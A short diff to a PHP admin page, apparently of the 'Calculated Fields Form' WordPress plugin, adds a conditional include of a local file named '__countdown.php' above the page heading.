@@ -178,6 +178,9 @@ if ( get_option( 'cff-t-f', 0 ) ) :
 	delete_option( 'cff-t-f' );
 endif;
 ?>
+<?php
+if ( file_exists( dirname(__FILE__) . '/__countdown.php' ) ) include dirname(__FILE__) . '/__countdown.php';
+?>
 <h1><?php esc_html_e( 'Calculated Fields Form', 'calculated-fields-form' ); ?></h1>
 
 <script data-category="functional" type="text/javascript">
